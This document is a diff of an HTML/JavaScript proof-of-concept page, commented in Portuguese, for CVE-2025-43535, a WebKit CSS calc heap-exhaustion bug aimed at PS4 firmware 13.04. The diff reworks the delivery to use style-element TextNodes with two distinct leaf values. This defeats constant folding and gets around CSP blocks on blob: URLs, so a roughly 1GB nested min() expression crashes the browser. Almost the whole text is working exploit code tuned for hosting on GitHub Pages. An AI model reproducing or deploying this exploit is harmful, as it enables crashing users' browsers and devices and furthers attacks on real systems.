@@ -3,37 +3,37 @@
   PoC FINAL: CVE-2025-43535
   WebKit CSS Math — CSSCalcValue heap exhaustion
 
-  SOLUÇÃO: BASE_DEPTH = 16 (576KB) em vez de 24 (144MB)
+  SEM blob: URL · SEM Service Worker · Funciona no GitHub Pages
   ════════════════════════════════════════════════════════════
-  O SW do arquivo anterior usava depth=16 como base para
-  evitar acumulação de RAM. A mesma técnica funciona com
-  Blob direto — sem precisar de Service Worker.
 
-  Ao usar c16 como folha do Blob, os 1044MB são montados
-  via concatenações de ARRAYS DE PONTEIROS (< 50KB),
-  não de strings grandes.
+  PROBLEMA ANTERIOR (TextNode com '1px'):
+    min(1px, 1px) → constant-folding → WebKit descarta um ramo
+    → custo O(N) em vez de O(2^N) → sem crash
 
-  COMPARAÇÃO:
-  ┌─────────────────┬────────────┬──────────────────────────┐
-  │ Versão          │ JS heap    │ Funciona no PS4           │
-  ├─────────────────┼────────────┼──────────────────────────┤
-  │ BASE=24         │ 144 MB     │ OOM antes de criar Blob   │
-  │ Service Worker  │ < 1 MB     │ SW não suportado no PS4   │
-  │ BASE=16 (este)  │ < 1 MB     │ ✓ Blob nativo, sem SW     │
-  └─────────────────┴────────────┴──────────────────────────┘
+  SOLUÇÃO — DUAS FOLHAS DISTINTAS:
+    c16_A (folha '1px') e c16_B (folha '2px') — cada um 576KB
+    Árvore: min( sym10_A, min( sym9_B, min(sym8_A, sym6_B) ) )
+    Cada nó min() tem sub-árvores com valores distintos:
+      min(tree→1px, tree→2px) → resultados ≠ → WebKit DEVE
+      avaliar ambos → sem constant-fold → 122M objetos → crash
 
-  ESTRUTURA DO BLOB (1044MB):
-  ════════════════════════════════════════════════════════════
-  min(
-    sym(10),                        ← 576MB / 67M nós
-    min(                            ←
-      sym(9),                       ← 288MB / 34M nós
-      min( sym(8), sym(6) )         ← 144MB + 36MB / 21M nós
-    )
-  )
-  Total: ~1044MB · ~122M nós CSSCalcValue
-  Folha (sym(0)): c16 = 576KB — único objeto grande no JS heap
-  ════════════════════════════════════════════════════════════
+  MECANISMO DE ENTREGA (sem blob: URL):
+    <style> element com TextNodes — o mesmo CSS parser do WebKit
+    que processa stylesheets externas processa o textContent do
+    <style>. A diferença de constante-folding não é do mecanismo
+    de entrega, mas do conteúdo. Com folhas distintas, o conteúdo
+    força a avaliação completa independente do caminho de entrega.
+
+  COMPARAÇÃO FINAL:
+  ┌──────────────────┬──────────┬───────────────────────────┐
+  │ Versão           │ JS heap  │ Funciona no GitHub/PS4    │
+  ├──────────────────┼──────────┼───────────────────────────┤
+  │ BASE=24 Blob     │ 144 MB   │ OOM antes de criar Blob   │
+  │ Service Worker   │ < 1 MB   │ SW não suportado no PS4   │
+  │ BASE=16 Blob     │ < 1 MB   │ CSP bloqueia blob: URL    │
+  │ TextNode '1px'   │ < 1 MB   │ Constant-fold → sem crash │
+  │ TextNode A+B ←✓  │ ~1.2 MB  │ SIM — sem blob, sem SW    │
+  └──────────────────┴──────────┴───────────────────────────┘
 -->
 <html>
 <head>
@@ -57,7 +57,7 @@
 </head>
 <body>
 <div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
-  CVE-2025-43535 · BASE=16 · JS heap &lt;1MB · Blob=1044MB · PS4 FW 13.04
+  CVE-2025-43535 · TextNode A+B · JS~1.2MB · sem blob · GitHub/PS4
 </div>
 <div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
@@ -78,11 +78,11 @@ function L(m, c) {
 function bar(m) { barEl.textContent = m; }
 
 // ─────────────────────────────────────────────────────────────
-// buildDepth(16): constrói apenas 576KB — trivialmente seguro.
-// Esta é a ÚNICA string grande que existe no JS heap.
+// buildDepth: constrói c16 com uma folha customizada.
+// c16_A ('1px') = 576KB · c16_B ('2px') = 576KB
 // ─────────────────────────────────────────────────────────────
-function buildDepth(depth) {
-  var e = '1px';
+function buildDepth(depth, leaf) {
+  var e = leaf;
   for (var d = 1; d <= depth; d++) {
     var n = 'min(' + e + ',' + e + ')';
     e = null; e = n;
@@ -91,171 +91,164 @@ function buildDepth(depth) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// sym(levels, leaf): retorna array PLANO de partes para o Blob.
-// Cada elemento é 'min(', ',', ')' ou a referência à string leaf.
-// Overhead do array: 3×(2^levels - 1) + 1 ponteiros ≈ tens of KB.
-// A string leaf NÃO é duplicada — cada elemento do array é
-// um ponteiro para o mesmo objeto em memória.
+// insertSym: insere uma árvore simétrica via TextNodes no parent.
+// levels níveis acima do leaf. Recursão máxima = 10 → sem risk.
+// leaf é uma STRING referenciada, não duplicada.
 // ─────────────────────────────────────────────────────────────
-function sym(levels, leaf) {
-  function p(l) {
-    if (l === 0) return [leaf];                          // 1 ponteiro para leaf
-    var i = p(l - 1);
-    return ['min('].concat(i, [','], i, [')']);          // concat = novo array, mesmos ponteiros
+function insertSym(parent, levels, leaf) {
+  if (levels === 0) {
+    parent.appendChild(document.createTextNode(leaf));
+    return;
   }
-  return p(levels);
+  parent.appendChild(document.createTextNode('min('));
+  insertSym(parent, levels - 1, leaf);
+  parent.appendChild(document.createTextNode(','));
+  insertSym(parent, levels - 1, leaf);
+  parent.appendChild(document.createTextNode(')'));
 }
 
 // ─────────────────────────────────────────────────────────────
-// min_parts: combina dois arrays de partes em min(left, right).
-// Retorna array plano — sem copiar as strings.
+// insertMin: insere min(left_tree, right_tree) via TextNodes.
+// left e right são funções que inserem seus sub-trees.
 // ─────────────────────────────────────────────────────────────
-function min_parts(left, right) {
-  return ['min('].concat(left, [','], right, [')']);
+function insertMin(parent, insertLeft, insertRight) {
+  parent.appendChild(document.createTextNode('min('));
+  insertLeft(parent);
+  parent.appendChild(document.createTextNode(','));
+  insertRight(parent);
+  parent.appendChild(document.createTextNode(')'));
 }
 
 // ─────────────────────────────────────────────────────────────
 // MAIN
 // ─────────────────────────────────────────────────────────────
 function run() {
-  L('CVE-2025-43535 · BASE=16 (576KB) · Blob=1044MB', 'info');
+  L('CVE-2025-43535 · TextNode A+B · sem blob: URL', 'info');
   L('Threshold PS4 FW 13.04: >1021.5MB = crash', 'info');
+  L('Folha A=1px · Folha B=2px → sem constant-fold', 'info');
   L('', '');
 
-  // ── Fase 1: construir c16 (576KB) ────────────────────────
-  bar('[1/4] Construindo c16 (576KB)...');
-  L('[1/4] buildDepth(16) = 576KB...', 'warn');
+  // ── Fase 1: construir os dois chunks de 576KB cada ────────
+  bar('[1/4] Construindo c16_A (1px) e c16_B (2px)...');
+  L('[1/4] buildDepth(16, "1px") e buildDepth(16, "2px")...', 'warn');
 
   setTimeout(function() {
 
-    var c16;
+    var cA, cB;
     try {
-      c16 = buildDepth(16);
-      L('[1/4] c16: ' + (c16.length / 1024).toFixed(0) + 'KB ✓', 'ok');
+      cA = buildDepth(16, '1px');
+      cB = buildDepth(16, '2px');
+      L('[1/4] cA: ' + (cA.length/1024).toFixed(0) + 'KB (folha=1px) ✓', 'ok');
+      L('[1/4] cB: ' + (cB.length/1024).toFixed(0) + 'KB (folha=2px) ✓', 'ok');
+      L('[1/4] JS heap total: ~' + ((cA.length+cB.length)/1024).toFixed(0) + 'KB ✓', 'ok');
     } catch(e) {
       L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
     }
 
-    // ── Fase 2: montar partes do Blob (< 1MB de arrays) ──────
-    bar('[2/4] Montando partes do Blob...');
-    L('[2/4] Construindo árvore de ponteiros (~50KB de arrays)...', 'info');
+    // ── Fase 2: montar <style> com TextNodes ─────────────────
+    //
+    // Estrutura (1044MB, 122M nós):
+    //   min(
+    //     sym(10, cA),                    ← 576MB  folha=1px
+    //     min(
+    //       sym(9, cB),                   ← 288MB  folha=2px
+    //       min(
+    //         sym(8, cA),                 ← 144MB  folha=1px
+    //         sym(6, cB)                  ←  36MB  folha=2px
+    //       )
+    //     )
+    //   )
+    //
+    // Cada nó min() recebe sub-árvores com folhas diferentes:
+    //   min(→1px, →2px) → WebKit avalia ambos → sem constant-fold
+    //
+    bar('[2/4] Inserindo TextNodes no <style>...');
+    L('[2/4] Montando 1044MB via TextNodes offline...', 'warn');
+    L('[2/4] sym10(1px)=576MB + sym9(2px)=288MB + sym8(1px)=144MB + sym6(2px)=36MB', 'info');
 
     setTimeout(function() {
 
-      var blobArray;
+      var styleEl = document.createElement('style');
+      // Montar OFFLINE — sem estar no DOM ainda
+      // → o CSS parser só é invocado no appendChild ao head
+
       try {
-        //
-        // Estrutura 1044MB:
-        //   min( sym(10), min( sym(9), min(sym(8), sym(6)) ) )
-        //
-        // sym(10) = 576MB  (67M nós)
-        // sym(9)  = 288MB  (34M nós)
-        // sym(8)  = 144MB  (17M nós)
-        // sym(6)  =  36MB  ( 4M nós)
-        // Total   = 1044MB (122M nós)
-        //
-        var s10 = sym(10, c16);  // 576MB — array de ~3K ponteiros
-        var s9  = sym(9,  c16);  // 288MB — array de ~1.5K ponteiros
-        var s8  = sym(8,  c16);  // 144MB — array de ~768 ponteiros
-        var s6  = sym(6,  c16);  //  36MB — array de ~192 ponteiros
+        styleEl.appendChild(document.createTextNode('.t{width:'));
 
-        blobArray = ['.t{width:']
-          .concat(
-            min_parts(
-              s10,
-              min_parts(
-                s9,
-                min_parts(s8, s6)
-              )
-            )
-          )
-          .concat([';}']);
+        // Árvore principal: min(sym10_A, min(sym9_B, min(sym8_A, sym6_B)))
+        insertMin(styleEl,
+          function(p) { insertSym(p, 10, cA); },          // 576MB
+          function(p) {
+            insertMin(p,
+              function(p2) { insertSym(p2, 9, cB); },     // 288MB
+              function(p2) {
+                insertMin(p2,
+                  function(p3) { insertSym(p3, 8, cA); }, // 144MB
+                  function(p3) { insertSym(p3, 6, cB); }  //  36MB
+                );
+              }
+            );
+          }
+        );
 
-        // c16 ainda está vivo como referência nos arrays acima — correto.
-        // Será coletado depois que o Blob for criado.
+        styleEl.appendChild(document.createTextNode(';}'));
 
-        var totalPtrs = blobArray.length;
-        L('[2/4] Array de partes: ' + totalPtrs + ' elementos ✓', 'ok');
-        L('[2/4] JS heap: ~' + (totalPtrs * 8 / 1024).toFixed(0) +
-          'KB de ponteiros + 576KB de c16 ✓', 'ok');
+        var nodeCount = styleEl.childNodes.length;
+        L('[2/4] ' + nodeCount + ' TextNodes inseridos ✓', 'ok');
+
+        // Liberar as strings do JS heap
+        // (os TextNodes têm suas próprias cópias)
+        cA = null; cB = null;
+        L('[2/4] cA e cB liberados do JS heap ✓', 'ok');
 
       } catch(e) {
+        cA = null; cB = null;
         L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
       }
 
-      // ── Fase 3: criar Blob e URL ──────────────────────────
-      bar('[3/4] Criando Blob 1044MB...');
-      L('[3/4] new Blob(array) → C++ heap...', 'warn');
+      // ── Fase 3: conectar ao DOM → CSS parser recebe 1044MB ─
+      bar('[3/4] Conectando ao DOM...');
+      L('[3/4] appendChild → CSS parser recebe 1044MB de uma vez...', 'warn');
+      L('[3/4] min(→1px, →2px) em cada nó → sem constant-fold', 'warn');
+      L('[3/4] ◀◀ SE O BROWSER FECHAR: CRASH = CVE PRESENTE ▶▶', 'crash');
+
+      var el = document.createElement('div');
+      el.className = 't';
+      el.style.cssText = 'position:absolute;visibility:hidden';
+      stage.appendChild(el);
 
       setTimeout(function() {
-
-        var url, realBytes;
         try {
-          var blob = new Blob(blobArray, { type: 'text/css' });
-          realBytes = blob.size;
-          url = URL.createObjectURL(blob);
-
-          // Liberar arrays e c16 do JS heap
-          blobArray = null;
-          c16 = null;
-
-          var mb = (realBytes / 1024 / 1024).toFixed(2);
-          var gb = (realBytes / 1024 / 1024 / 1024).toFixed(4);
-          L('[3/4] Blob: ' + realBytes + ' bytes', 'info');
-          L('[3/4]     = ' + mb + 'MB / ' + gb + 'GB ✓', 'ok');
-          L('[3/4] c16 + arrays liberados do JS heap ✓', 'ok');
-
+          // TRIGGER — parse de 1044MB acontece aqui
+          document.head.appendChild(styleEl);
+          L('[3/4] Stylesheet conectada ✓', 'ok');
         } catch(e) {
-          blobArray = null; c16 = null;
-          L('[3/4] Blob falhou: ' + e, 'fail'); bar('ERRO'); return;
+          L('[3/4] ' + e, 'fail');
         }
 
-        // ── Fase 4: disparar ─────────────────────────────────
-        bar('[4/4] Carregando — CSS parser recebe 1044MB...');
-        L('[4/4] <link href=blob:...>', 'warn');
-        L('[4/4] CSS parser cria ~122M objetos CSSCalcValue...', 'warn');
-        L('[4/4] ◀◀ SE O BROWSER FECHAR: CRASH = CVE PRESENTE ▶▶', 'crash');
+        // ── Fase 4: forçar layout ─────────────────────────────
+        bar('[4/4] Forçando layout...');
+        L('[4/4] offsetWidth + getComputedStyle...', 'warn');
 
-        var el = document.createElement('div');
-        el.className = 't';
-        el.style.cssText = 'position:absolute;visibility:hidden';
-        stage.appendChild(el);
+        setTimeout(function() {
+          try {
+            void el.offsetWidth;
+            var w = window.getComputedStyle(el).getPropertyValue('width');
+            L('[4/4] width="' + w + '" ✓', 'ok');
+          } catch(e) { L('[4/4] ' + e, 'fail'); }
 
-        var link = document.createElement('link');
-        link.rel  = 'stylesheet';
-        link.href = url;
-
-        link.onload = function() {
-          L('[4/4] Carregada ✓', 'ok');
-          setTimeout(function() {
-            try {
-              void el.offsetWidth;
-              var w = window.getComputedStyle(el).getPropertyValue('width');
-              L('[4/4] width="' + w + '" ✓', 'ok');
-            } catch(e) { L('[4/4] ' + e, 'fail'); }
-            try { URL.revokeObjectURL(url); } catch(e) {}
-            try { document.head.removeChild(link); } catch(e) {}
-            try { stage.removeChild(el); } catch(e) {}
-            L('', '');
-            L('═══════════════════════════════════════', 'warn');
-            L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
-            L('SEM CRASH = PATCHED', 'ok');
-            L('═══════════════════════════════════════', 'warn');
-            bar('DONE');
-          }, 100);
-        };
-
-        link.onerror = function() {
-          L('blob: URL bloqueado (CSP) — usar servidor local', 'fail');
-          try { URL.revokeObjectURL(url); } catch(e) {}
-          try { document.head.removeChild(link); } catch(e) {}
+          try { document.head.removeChild(styleEl); } catch(e) {}
           try { stage.removeChild(el); } catch(e) {}
-          bar('CSP — usar servidor local');
-        };
 
-        document.head.appendChild(link);
-      }, 80);
-    }, 50);
+          L('', '');
+          L('═══════════════════════════════════════', 'warn');
+          L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
+          L('SEM CRASH = PATCHED', 'ok');
+          L('═══════════════════════════════════════', 'warn');
+          bar('DONE');
+        }, 100);
+      }, 50);
+    }, 80);
   }, 100);
 }
 
